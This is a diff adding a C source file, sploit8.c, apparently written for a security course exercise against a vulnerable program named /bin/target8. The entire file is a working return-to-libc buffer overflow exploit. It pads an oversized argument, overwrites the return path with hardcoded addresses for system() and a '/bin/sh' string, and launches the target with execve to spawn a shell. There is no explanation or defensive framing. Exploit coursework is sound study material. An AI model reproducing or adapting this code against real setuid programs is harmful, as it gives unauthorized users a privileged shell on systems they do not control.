@@ -1,0 +1,29 @@
+hack3rs@ip-172-31-23-108:~/sploits$ vim sploit8.c
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+#define  TARGET "/bin/target8"
+#define ADDR_OF_SYSTEM 0xf7e5e3e0
+#define PTR_TO_BIN 0xffffdd1c
+#define ADDR_OF_BUF 0xffffdbcc
+int main(void)
+{
+  char *args[3];
+  char *env[1];
+  char evil[343+1];
+  memset(evil, 'a', sizeof(evil));
+  memcpy(evil+336, "/bin/sh", 7);
+  //evil[342] = 0;
+  *(int*)(evil + 324) = ADDR_OF_SYSTEM;
+  *(int*)(evil + 332) = PTR_TO_BIN;
+  evil[sizeof(evil)-1] = 0;
+
+  args[0] = TARGET; args[1] = evil; args[2] = NULL;
+  env[0] = NULL;
+
+  if (0 > execve(TARGET, args, env))
+    perror("execve failed");  return 0;
+}
